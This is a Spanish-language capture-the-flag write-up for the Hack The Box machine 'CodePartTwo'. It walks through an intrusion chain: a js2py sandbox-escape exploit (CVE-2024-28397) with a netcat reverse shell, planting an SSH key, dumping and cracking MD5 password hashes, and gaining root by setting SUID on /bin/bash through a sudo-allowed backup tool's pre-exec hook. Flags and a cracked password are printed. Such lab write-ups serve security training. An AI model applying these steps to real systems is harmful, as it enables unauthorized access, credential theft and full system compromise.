# Hack the box: Sandbox escape

## Host: Linux
## IP: 10.10.11.82
## Procedimiento y comandos
#### Paso 1: Enumeracions
```bash
# Nmap 7.95 scan initiated Thu Sep  4 12:37:52 2025 as: /usr/lib/nmap/nmap -A -oN CodePartTwo-nmap.txt 10.10.11.82
Nmap scan report for 10.10.11.82
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   164.72 ms 10.10.14.1
2   164.94 ms 10.10.11.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  4 12:38:10 2025 -- 1 IP address (1 host up) scanned in 18.86 seconds
```

* Directorios

```bash
$ gobuster dir -u http://10.10.11.82:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100
 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://codetwo.htb:8000/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 667]
/download             (Status: 200) [Size: 10696]
/register             (Status: 200) [Size: 651]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```
#### Paso 2: Acceso inicial

* Descargamos el codigo fuente desde la url Download

> Revisando encontramos que es un sandbox **js2py** buscmos vulnerabilidades, encontramos el siguiente exploit

[php exploit](https://github.com/Leilamag/CodeTwoRCEExploit)

* Seguimos las instrucciones en el README.md.. instalacion de compose, php etc..

* Explotamos, levantamos un receptor nc en el puerto 4444:

1. Exploit

```bash
 php CodeTwoRCEExploit.php -t 10.10.11.82 -p 8000 -P /run_code -l 10.10.14.188 -r 4444 -u test -w test -v
=======================================
     Exploit js2py CVE-2024-28397
=======================================
[*] Attempting to login with username=test&password=test...
[+] Login successful. Status: 200
[+] Login response body: Invalid credentials
[*] Running exploit against 10.10.11.82:8000 (URI: /run_code)...
[*] Sending payload to code editor...
[-] Error: cURL error 28: Operation timed out after 10002 milliseconds with 0 bytes received (see https://curl.haxx.se/libcurl/c/libcurl-errors.html) for http://10.10.11.82:8000/run_code
[+] Exploit executed. Check your listener.
```

2. Receptor

```bash
  nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.188] from (UNKNOWN) [10.10.11.82] 39058
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
app
bash-5.0$ 
```
> Con el fin de trabajar mas comodos nos conectamos por **ssh**

1. Creamos directorio .ssh en app si no existe

```bash
mkdir .ssh && cd .ssh
```
2. Copiamos la clave publica de nuestro kali en **authorized_keys**

```bash
echo "<kali_id_rsa.pub>" > authorized_keys
```
3. Nos conectamos como app por ssh

```bash
  ssh app@10.10.11.82 -P 22

bash-5.0$
...
```
#### Paso 3: Movimiento lateral

1. Encontramos users.db dentro de _/app/instances/users.db_ y observamos sqlite3 en ejecucion

```bash
bash-5.0$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
```
2. Desplegamos tablas

```bash
sqlite> .tables
code_snippet  user
```
3. Dumpeamos la tabla **user**

```bash
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|neur|827ccb0eea8a706c4c34a16891f84e7b
```

4. Crackeamos el hash de marco:

* [CrackStation](https://crackstation.net/)

* hashcat:

```bash
hashcat -m 0 -a 0 "649c9d65a206a75f5abe509fe128bce5" /usr/share/wordlists/rockyou.txt

===========================================
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove 
===========================================
```

5. Nos conectamos por **ssh** con el usuario **marco**

```bash
  ssh marco@10.10.11.82 -P 22
marco@10.10.11.82's password: sweetangelbabylove

============================
bash-5.0$ whoami
marco
bash-5.0$ 
```

6. Obtenemos el flag user.txt

```bash
-bash-5.0$ ls
backups  npbackup.conf  user.txt
-bash-5.0$ cat user.txt
90292719142d6f36175a265849654db8
-bash-5.0$ 
```

#### Paso 4: Escalada de privilegios

* Notamos al listar archvos una carpeta backup y un archivo npbackup.conf

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
-bash-5.0$ 
```

> Podemos ejecutar como **super user** npbackup-cli

1. Observamos el contenido del .conf y vemos que tiene un par de parametros interesantes que se pueden modificar:

* pre_exec_commands:[]
* post_exec_commands:[]

> Al intentar editar el archivo directamente vemos que no tenemos permisos de edicion por lo tanto generamos una copia

```bash
cp npbackup.conf pwn.conf
```

2. Editamos el archivo pwn.conf

```bash
pre_exec_commands: "chmod 4755 /bin/bash"
```
3. Ejecutamos npbackup-cli

```bash
-bash-5.0$ sudo npbackup-cli -c pwn.conf -b
```

4. Revisamos permisos de /bin/bash

```bash
ls -la /bin/bash

-bash-5.0$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

5. Ejecutamos y obtenemos el flag

```bash
-bash-5.0$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
749a921cba845593e233790b99f5d842
bash-5.0# 
```
